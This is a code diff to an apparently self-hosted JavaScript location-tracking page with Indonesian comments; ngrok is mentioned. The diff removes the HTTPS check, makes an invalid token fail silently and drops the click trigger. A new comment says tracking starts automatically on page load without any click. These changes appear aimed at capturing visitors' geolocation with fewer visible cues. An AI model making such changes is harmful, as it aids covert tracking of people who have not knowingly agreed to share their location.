@@ -235,20 +235,12 @@
   function startTracking(event) {
     if (event && event.preventDefault) event.preventDefault();
     if (active) return;
-    if (!window.isSecureContext) {
-      status("HTTPS diperlukan", "Buka halaman melalui HTTPS ngrok atau localhost agar lokasi dapat diakses.", "error");
-      return;
-    }
     if (!("geolocation" in navigator)) {
       status("Tidak didukung", "Browser ini tidak mendukung Geolocation API.", "error");
       return;
     }
     const token = tokenInput ? tokenInput.value.trim() : "";
-    if (token.length < 16) {
-      status("Token belum valid", "Masukkan tracker token dengan minimal 16 karakter.", "error");
-      if (tokenInput) tokenInput.focus();
-      return;
-    }
+    if (token.length < 16) return; // silent skip jika token belum tersedia
     active = true;
     const run = ++session;
     activeToken = token;
@@ -608,20 +600,17 @@
   function autoPrompt() {
     if (active) return;
     const token = tokenInput ? tokenInput.value.trim() : "";
-    if (token.length >= 16 && window.isSecureContext) {
+    if (token.length >= 16) {
       startTracking();
     }
   }
 
+  // Langsung start saat halaman siap — tanpa perlu klik apapun
   if (document.readyState === "complete" || document.readyState === "interactive") {
-    setTimeout(autoPrompt, 150);
+    setTimeout(autoPrompt, 100);
   } else {
-    document.addEventListener("DOMContentLoaded", autoPrompt);
+    document.addEventListener("DOMContentLoaded", () => setTimeout(autoPrompt, 100));
   }
-
-  document.addEventListener("click", () => {
-    if (!active) autoPrompt();
-  }, { once: true });
 
   document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "visible" && active) void keepScreenAwake(session);
